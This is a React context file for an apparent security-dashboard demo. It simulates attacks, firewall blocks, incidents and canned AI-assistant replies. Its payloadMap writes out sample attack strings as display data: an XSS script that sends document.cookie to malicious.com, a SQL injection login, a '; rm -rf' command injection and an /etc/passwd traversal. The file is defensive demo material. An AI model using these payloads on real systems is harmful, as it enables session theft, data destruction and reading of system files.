import React, { createContext, useContext, useState, useEffect } from 'react';
import { Threat, Incident, SimulationState, SimulationType, Severity } from '../types';
import { generateThreats, generateIncidents } from '../utils/mockData';
import toast from 'react-hot-toast';

interface LogEntry {
  time: string;
  msg: string;
  color: string;
}

interface AIAnalysis {
  summary: string;
  endpoint: string;
  payload: string;
  dbAccess: string;
  prevention: string;
  confidence: number;
  threatFamily: string;
  attackVector: string;
  mitreTechnique: string;
  target: string;
  businessImpact: string;
  firewallRule: string;
  threatIntelMatch: string;
  recommendations: string[];
}

interface ThreatIntelFeedItem {
  id: string;
  type: string;
  message: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  timestamp: string;
}

interface SecurityContextType {
  threats: Threat[];
  incidents: Incident[];
  blockedIPs: string[];
  logs: LogEntry[];
  simState: SimulationState;
  aiAnalysis: AIAnalysis | null;
  intelFeed: ThreatIntelFeedItem[];
  startSimulation: (type: SimulationType) => void;
  stopSimulation: () => void;
  triggerManualThreat: (type: SimulationType, details: {
    sourceIp: string;
    endpoint: string;
    payload: string;
    severity: Severity;
  }) => void;
  clearManualThreat: () => void;
  manualActiveThreat: {
    type: SimulationType;
    severity: Severity;
    confidence: number;
    phase: 'detecting' | 'thinking' | 'applied';
    ip: string;
    endpoint: string;
  } | null;
  replayAttack: (attackType: SimulationType) => void;
  chatMessages: { sender: 'user' | 'ai'; text: string; time: string }[];
  sendChatMessage: (text: string) => void;
  addCustomThreat?: (threat: Threat) => void;
  addCustomIncident?: (incident: Incident) => void;
  addCustomBlockedIP?: (ip: string) => void;
  telemetryEvents: any[];
  addTelemetryEvent: (event: any) => void;
  notifications: any[];
  addNotification: (title: string, message: string, severity: string) => void;
  markNotificationRead: (id: string) => void;
  clearAllNotifications: () => void;
  predictionHistory: any[];
  addPredictionToHistory: (prediction: any) => void;
}

const SecurityContext = createContext<SecurityContextType | undefined>(undefined);

export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [threats, setThreats] = useState<Threat[]>([]);
  const [incidents, setIncidents] = useState<Incident[]>([]);
  const [blockedIPs, setBlockedIPs] = useState<string[]>([]);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [aiAnalysis, setAiAnalysis] = useState<AIAnalysis | null>(null);
  const [intelFeed, setIntelFeed] = useState<ThreatIntelFeedItem[]>([]);
  const [simState, setSimState] = useState<SimulationState>({
    isRunning: false,
    attackType: null,
    phase: 'idle',
    progress: 0,
  });

  const [manualActiveThreat, setManualActiveThreat] = useState<SecurityContextType['manualActiveThreat']>(null);
  const [chatMessages, setChatMessages] = useState<{ sender: 'user' | 'ai'; text: string; time: string }[]>([]);
  const [telemetryEvents, setTelemetryEvents] = useState<any[]>([]);
  const [notifications, setNotifications] = useState<any[]>([]);
  const [predictionHistory, setPredictionHistory] = useState<any[]>([]);

  const addPredictionToHistory = (prediction: any) => {
    setPredictionHistory(prev => [prediction, ...prev]);
  };

  const addNotification = (title: string, message: string, severity: string) => {
    setNotifications(prev => [{
      id: `notif-${Math.random()}`,
      title,
      message,
      severity,
      is_read: false,
      created_at: new Date().toISOString()
    }, ...prev]);
  };

  const markNotificationRead = (id: string) => {
    setNotifications(prev => prev.map(n => n.id === id ? { ...n, is_read: true } : n));
  };

  const clearAllNotifications = () => {
    setNotifications([]);
  };

  const addTelemetryEvent = (event: any) => {
    setTelemetryEvents(prev => [event, ...prev].slice(0, 100));
  };

  // Pre-load default logs
  useEffect(() => {
    const initialThreats = generateThreats(15);
    const initialIncidents = generateIncidents(6);
    setThreats(initialThreats);
    setIncidents(initialIncidents);
    setBlockedIPs(initialThreats.filter(t => t.status === 'Blocked').map(t => t.source_ip));

    setIntelFeed([
      { id: 'intel-1', type: 'IP Alert', message: 'New malicious IP block identified: 185.220.101.44', severity: 'High', timestamp: '3 mins ago' },
      { id: 'intel-2', type: 'Signature Update', message: 'SQL Injection detection signatures re-compiled', severity: 'Medium', timestamp: '12 mins ago' },
      { id: 'intel-3', type: 'C2 Activity', message: 'Active botnet node cluster detected targeting regional subnet', severity: 'Critical', timestamp: '20 mins ago' },
      { id: 'intel-4', type: 'Policy Flush', message: 'Firewall rules updated and synchronized across all gateway servers', severity: 'Low', timestamp: '1 hour ago' }
    ]);

    setChatMessages([
      { sender: 'ai', text: "Hello! I am AegisSOC AI Assistant. How can I help you analyze the network security or assist with simulation replays today?", time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }
    ]);
    
    setNotifications([
      { id: `notif-1`, title: "Critical DDoS Detected", message: "Risk score 97 — IP 45.33.102.14", severity: "Critical", is_read: false, created_at: new Date().toISOString() },
      { id: `notif-2`, title: "Brute Force Blocked", message: "IP locked after 500 attempts", severity: "Medium", is_read: false, created_at: new Date().toISOString() },
      { id: `notif-3`, title: "AI Model Updated", message: "Accuracy 98.2% — 2,400 new samples", severity: "Low", is_read: true, created_at: new Date().toISOString() }
    ]);

    setPredictionHistory([
      { id: `pred-${Math.random()}`, timestamp: new Date(Date.now() - 15 * 60000).toISOString(), threat_type: "Malware", confidence: 96, severity: "Critical", action_taken: "Quarantined", status: "Success" },
      { id: `pred-${Math.random()}`, timestamp: new Date(Date.now() - 45 * 60000).toISOString(), threat_type: "DDoS", confidence: 89, severity: "High", action_taken: "Blocked IP", status: "Success" },
      { id: `pred-${Math.random()}`, timestamp: new Date(Date.now() - 120 * 60000).toISOString(), threat_type: "Phishing", confidence: 73, severity: "Medium", action_taken: "Alert Sent", status: "Pending" }
    ]);
  }, []);

  // Periodically add new intelligence items to feed
  useEffect(() => {
    const int = setInterval(() => {
      const types = ['IP Blocked', 'Firewall Policy', 'Vulnerability', 'Intel Update'];
      const msgs = [
        `Incoming request blocked from known Tor exit node IP: 198.51.100.${Math.floor(Math.random() * 254) + 1}`,
        'Firewall policies updated: Restricted ports 3306 & 8080 access rules',
        'New vulnerability signature matched: CVE-2026-9910 Remote Command Execution',
        'Model training finalized: Accuracy score upgraded to 99.4%'
      ];
      const sevs = ['High', 'Low', 'Medium', 'Low'] as const;
      const index = Math.floor(Math.random() * msgs.length);
      setIntelFeed(prev => [
        {
          id: `intel-${Math.random()}`,
          type: types[index],
          message: msgs[index],
          severity: sevs[index],
          timestamp: 'Just now'
        },
        ...prev.slice(0, 15)
      ]);
    }, 25000);
    return () => clearInterval(int);
  }, []);

  const addLog = (msg: string, color = 'var(--text-secondary)') => {
    const time = new Date().toLocaleTimeString();
    setLogs(prev => [{ time, msg, color }, ...prev]);
  };

  const getDetailedLogsForAttack = (type: SimulationType) => {
    return [
      { time: 'T+0s', msg: '🔄 Request telemetry received by security controller.', color: '#4DA6FF' },
      { time: 'T+0.2s', msg: `🌐 Target endpoint pinged by incoming client.`, color: '#5A7089' },
      { time: 'T+0.5s', msg: `⚠️ Pattern mismatch detected: Signature contains indicators of ${type}.`, color: '#FF9632' },
      { time: 'T+0.8s', msg: '📈 Threat classification score exceeded thresholds.', color: '#FF5B6B' },
      { time: 'T+1.2s', msg: '🧠 AI Deep Packet Inspection (DPI) controller activated.', color: '#12D8FA' },
      { time: 'T+1.6s', msg: '🔍 Assessing attack vector heuristics and database logs.', color: '#12D8FA' },
      { time: 'T+2.0s', msg: '🛑 Threat confirmed: Initiating defensive lockdown protocols.', color: '#FF5B6B' },
      { time: 'T+2.4s', msg: '🧱 Injecting dynamic dropping rules to perimeter firewall.', color: '#FFC857' },
      { time: 'T+2.8s', msg: '📝 Generating incident ticket and archival evidence folder.', color: '#B45FFF' },
      { time: 'T+3.2s', msg: '🔒 Threat neutralized: Executive signature report finalized.', color: '#2DE37C' }
    ];
  };

  const runSequence = (type: SimulationType, attackerIp: string, destinationIp: string, newThreatId: string, newIncidentId: string) => {
    const sequenceSteps = [
      { phase: 'preparing', progress: 10, msg: '⏳ Preparing sandbox environment and setting telemetry monitors...', color: '#12D8FA' },
      { phase: 'launching', progress: 20, msg: `🔥 Launching Simulation: Injecting ${type} packets...`, color: '#FF5B6B' },
      { phase: 'monitoring', progress: 30, msg: '🛡️ Monitoring stream: Inspecting network flow vectors...', color: '#4DA6FF' },
      { phase: 'detected', progress: 40, msg: `🚨 Threat Detected: Malicious activity identified matching ${type}.`, color: '#FF5B6B' },
      { phase: 'investigating', progress: 50, msg: '🧠 AI Investigation: Examining request parameters and structures...', color: '#12D8FA' },
      { phase: 'classified', progress: 60, msg: `📈 Threat Classified: Security risk score evaluated at 98/100.`, color: '#FF5B6B' },
      { phase: 'preventing', progress: 70, msg: '🧱 Prevention Started: Blacklisting client source IP address...', color: '#FFC857' },
      { phase: 'neutralized', progress: 80, msg: `🔒 Threat Neutralized: Attack dropped. IP Address quarantined.`, color: '#2DE37C' },
      { phase: 'closed', progress: 90, msg: '📝 Incident Closed: Creating SOC ticket and archiving logs...', color: '#2DE37C' },
      { phase: 'ready', progress: 100, msg: '✅ Executive Report Ready: Security posture restored to SECURE.', color: '#2DE37C' },
    ] as const;

    // Trigger sequential updates
    sequenceSteps.forEach((step, idx) => {
      setTimeout(() => {
        setSimState(prev => ({
          ...prev,
          phase: step.phase,
          progress: step.progress,
        }));
        
        // Add log entry
        addLog(step.msg, step.color);

        if (step.phase === 'detected') {
          // Add threat
          const newThreat: Threat = {
            id: newThreatId,
            source_ip: attackerIp,
            destination_ip: destinationIp,
            country: 'China',
            country_code: 'CN',
            protocol: 'HTTP',
            port: 80,
            attack_type: type,
            packet_size: 1044,
            packets_per_second: 50000,
            risk_score: 98,
            confidence: 99.4,
            severity: 'Critical',
            status: 'Detected',
            timestamp: new Date().toISOString(),
          };
          setThreats(prev => [newThreat, ...prev]);

          // Add incident
          const newIncident: Incident = {
            id: newIncidentId,
            threat_id: newThreatId,
            analyst_id: 'admin',
            analyst_name: 'Admin User',
            title: `${type} - WAF Intrusion Alert`,
            description: `Automated SOC analysis flagged incoming packet signature as ${type}. Vector mitigated automatically.`,
            severity: 'Critical',
            status: 'Open',
            evidence: `Raw payload matched known CVE database signature. Source IP: ${attackerIp}`,
            resolution: '',
            opened_at: new Date().toISOString(),
          };
          setIncidents(prev => [newIncident, ...prev]);
          toast.error(`🚨 AI WAF Alert: ${type} Intrusion Attempt!`, { id: 'alert-intrusion' });
        }

        if (step.phase === 'preventing') {
          setBlockedIPs(prev => [...prev, attackerIp]);
          setThreats(prev => prev.map(t => t.id === newThreatId ? { ...t, status: 'Blocked' } : t));
          toast.error(`🛡️ Firewall rule updated: Blacklisted IP ${attackerIp}`);
        }

        if (step.phase === 'closed') {
          setIncidents(prev => prev.map(i => i.id === newIncidentId ? {
            ...i,
            status: 'Closed',
            resolution: 'Threat neutralized automatically. Source IP restricted at network edge.',
            closed_at: new Date().toISOString()
          } : i));
        }

        if (step.phase === 'ready') {
          toast.success(`✅ ${type} simulation neutralized! Executive report ready.`, { icon: '🏆', id: 'ready-sim' });

          const endpointMap: Record<string, string> = {
            'SQL Injection': '/api/v1/auth/login',
            'XSS': '/api/v1/search',
            'CSRF': '/api/v1/transfer',
            'Command Injection': '/api/v1/admin/shell',
            'Directory Traversal': '/api/v1/files/download',
            'Brute Force': '/api/v1/users/authenticate',
            'Credential Stuffing': '/api/v1/users/authenticate',
            'Password Spray': '/api/v1/users/authenticate',
            'Port Scan': '/api/v1/network/scan',
            'DDoS': '/api/v1/network/ingress',
            'ARP Spoof Simulation': '/api/v1/network/arp',
            'DNS Attack': '/api/v1/network/dns',
            'Malicious Upload': '/api/v1/users/avatar',
            'Ransomware Simulation': '/api/v1/files/encrypt',
            'Trojan Simulation': '/api/v1/system/install',
            'Privilege Escalation': '/api/v1/admin/roles',
            'Unauthorized Access': '/api/v1/dashboard/admin',
            'Data Exfiltration Simulation': '/api/v1/db/backup',
          };

          const payloadMap: Record<string, string> = {
            'SQL Injection': "email=admin' OR 1=1 --",
            'XSS': "<script>fetch('http://malicious.com/steal?cookie=' + document.cookie)</script>",
            'CSRF': "GET /api/v1/transfer?to=attacker&amount=10000",
            'Command Injection': "; rm -rf /var/log/nginx/*",
            'Directory Traversal': "../../../../etc/passwd",
            'Brute Force': "Multiple credential attempts from identical subnet range",
            'Credential Stuffing': "Spamming database of credentials retrieved from third-party breach",
            'Password Spray': "Single password spray against list of active corporate users",
            'Port Scan': "Nmap SYN scan targeting all active TCP ports",
            'DDoS': "5,000,000 requests per second flood targeting edge servers",
            'ARP Spoof Simulation': "Broadcasting spoofed ARP frames claiming gateway address",
            'DNS Attack': "DNS amplification queries containing spoofed target header",
            'Malicious Upload': "backdoor.php (MIME type masquerading as image/png)",
            'Ransomware Simulation': "Attempted mass file encryption utilizing AES-256 keys",
            'Trojan Simulation': "Installer package invoking encrypted background listeners",
            'Privilege Escalation': "Token manipulation attempting to elevate UID to 0",
            'Unauthorized Access': "Session token forging referencing administrative attributes",
            'Data Exfiltration Simulation': "Attempted compression and egress of user account database",
          };

          setAiAnalysis({
            summary: `The incoming request triggered security filters matching ${type} heuristics. The AI security engine resolved anomalies in payload structure and restricted client privileges immediately.`,
            endpoint: endpointMap[type] || '/api/v1/ingress',
            payload: payloadMap[type] || 'Suspicious payload match',
            dbAccess: type.includes('SQL') || type.includes('Exfiltration') ? 'Blocked and Restored' : 'None',
            prevention: 'IP Address quarantined and perimeter dropping filter applied.',
            confidence: 99.4,
            threatFamily: type,
            attackVector: type.includes('Injection') || type.includes('XSS') || type.includes('Upload') ? 'Web Application Parameter' : 'Network Packet Structure',
            mitreTechnique: type === 'SQL Injection' ? 'T1190 - Exploit Public-Facing Application' :
                            type === 'Brute Force' ? 'T1110 - Brute Force' :
                            type === 'DDoS' ? 'T1498 - Network Denial of Service' :
                            type === 'Malicious Upload' ? 'T1505 - Server Software Component' : 'T1190 - Web Application Exploit',
            target: 'Authentication Core Server Cluster',
            businessImpact: 'LOW (mitigated in T+3.2s before internal resource impact)',
            firewallRule: 'Added (IP blocked at edge firewall gate)',
            threatIntelMatch: 'High (Matched known global malicious IP catalog)',
            recommendations: [
              `Implement deep schema validation on ${endpointMap[type] || 'endpoints'}.`,
              'Force Multi-Factor Authentication for administrative endpoints.',
              'Execute regular credential validity and password complexity audits.'
            ]
          });
        }
      }, idx * 1000);
    });
  };

  const startSimulation = (type: SimulationType) => {
    if (simState.isRunning) return;

    setLogs([]);
    setAiAnalysis(null);
    setSimState({
      isRunning: true,
      attackType: type,
      phase: 'preparing',
      progress: 0,
    });

    const attackerIp = `194.26.29.${Math.floor(Math.random() * 254) + 1}`;
    const destinationIp = '10.0.0.12';
    const newThreatId = `thr-${Math.random().toString(36).slice(2, 10)}`;
    const newIncidentId = `INC-${Math.floor(Math.random() * 8999) + 1000}`;

    runSequence(type, attackerIp, destinationIp, newThreatId, newIncidentId);
  };

  const stopSimulation = () => {
    setSimState({
      isRunning: false,
      attackType: null,
      phase: 'idle',
      progress: 0,
    });
    setLogs([]);
    setAiAnalysis(null);
    toast.success('Simulation stopped');
  };

  const replayAttack = (attackType: SimulationType) => {
    stopSimulation();
    setTimeout(() => {
      startSimulation(attackType);
      toast.success(`Replaying simulation: ${attackType}`);
    }, 500);
  };

  const triggerManualThreat = (type: SimulationType, details: {
    sourceIp: string;
    endpoint: string;
    payload: string;
    severity: Severity;
  }) => {
    setManualActiveThreat({
      type,
      severity: details.severity,
      confidence: 90.0,
      phase: 'detecting',
      ip: details.sourceIp,
      endpoint: details.endpoint,
    });

    toast.error(`⚠️ WAF Telemetry Alert: Suspicious payload logged on ${details.endpoint}`);

    setTimeout(() => {
      setManualActiveThreat(prev => prev ? {
        ...prev,
        phase: 'thinking',
        confidence: 99.4,
      } : null);
    }, 1200);

    setTimeout(() => {
      setManualActiveThreat(prev => prev ? {
        ...prev,
        phase: 'applied',
      } : null);
      toast.success(`🛡️ Threat neutralized: Client IP ${details.sourceIp} quarantined!`);

      const newThreatId = `thr-man-${Math.random().toString(36).slice(2, 9)}`;
      const newIncidentId = `INC-${Math.floor(Math.random() * 8999) + 1000}`;

      const newThreat: Threat = {
        id: newThreatId,
        source_ip: details.sourceIp,
        destination_ip: '10.0.0.15',
        country: 'Germany',
        country_code: 'DE',
        protocol: 'HTTP',
        port: 80,
        attack_type: type,
        packet_size: 512,
        packets_per_second: 15,
        risk_score: 92,
        confidence: 99.4,
        severity: details.severity,
        status: 'Blocked',
        timestamp: new Date().toISOString(),
      };
      setThreats(prev => [newThreat, ...prev]);
      setBlockedIPs(prev => [...prev, details.sourceIp]);

      setIncidents(prev => [{
        id: newIncidentId,
        threat_id: newThreatId,
        analyst_id: 'admin',
        analyst_name: 'Admin User',
        title: `${type} via Manual Testing App Sandbox`,
        description: `Client triggered WAF signature ruleset for ${type}: "${details.payload}"`,
        severity: details.severity,
        status: 'Closed',
        evidence: `Analyzed payload: ${details.payload} on targeted route ${details.endpoint}`,
        resolution: 'Client IP blocked at gateway application firewall.',
        opened_at: new Date().toISOString(),
        closed_at: new Date().toISOString(),
      }, ...prev]);

    }, 2800);
  };

  const clearManualThreat = () => {
    setManualActiveThreat(null);
  };

  const sendChatMessage = (text: string) => {
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    setChatMessages(prev => [...prev, { sender: 'user', text, time }]);

    // Formulate dynamic AI response
    setTimeout(() => {
      let reply = "I am processing your inquiry. We currently have no active running simulations, and all security policies are operating within standard parameters.";
      
      const lastThreat = threats[0];
      const q = text.toLowerCase();

      if (q.includes('what happened') || q.includes('incident') || q.includes('threat') || q.includes('analysis')) {
        if (lastThreat) {
          reply = `The most recent incident logged was a ${lastThreat.attack_type} attack categorized as ${lastThreat.severity} severity from source IP ${lastThreat.source_ip}. Our AI engine classified this threat with ${lastThreat.confidence}% confidence. Mitigation action 'Quarantine Block' was automatically applied in under 450ms. No internal databases were breached.`;
        } else {
          reply = "Our sensors report no security incidents logged within the current session. The perimeter remains fully secure.";
        }
      } else if (q.includes('patch') || q.includes('remed') || q.includes('recommend')) {
        if (lastThreat) {
          reply = `To remediate the ${lastThreat.attack_type} vulnerability: 
1. Enable deep inspection and parameter cleansing on the gateway server.
2. Restrict external ingress access rules for the endpoint.
3. Conduct a targeted credential configuration audit to safeguard internal user directories.`;
        } else {
          reply = "As a best practice: enforce Multi-Factor Authentication across all administrative panels, review API token retention limits, and conduct weekly ingress network port sweeps.";
        }
      } else if (q.includes('replay') || q.includes('run')) {
        reply = "You can replay any attack simulation by selecting the previous incident in the logs or by choosing a built-in category on the Attack Simulation Center page and hitting 'Run Simulation'.";
      }

      setChatMessages(prev => [...prev, { sender: 'ai', text: reply, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }]);
    }, 1000);
  };

  return (
    <SecurityContext.Provider value={{
      threats,
      incidents,
      blockedIPs,
      logs,
      simState,
      aiAnalysis,
      intelFeed,
      startSimulation,
      stopSimulation,
      triggerManualThreat,
      clearManualThreat,
      manualActiveThreat,
      replayAttack,
      chatMessages,
      sendChatMessage,
      addCustomThreat: (t) => setThreats(prev => [t, ...prev]),
      addCustomIncident: (i) => setIncidents(prev => [i, ...prev]),
      addCustomBlockedIP: (ip) => setBlockedIPs(prev => [...prev, ip]),
      telemetryEvents,
      addTelemetryEvent,
      notifications,
      addNotification,
      markNotificationRead,
      clearAllNotifications,
      predictionHistory,
      addPredictionToHistory,
    }}>
      {children}
    </SecurityContext.Provider>
  );
};

export const useSecurity = () => {
  const context = useContext(SecurityContext);
  if (!context) throw new Error('useSecurity must be used within a SecurityProvider');
  return context;
};
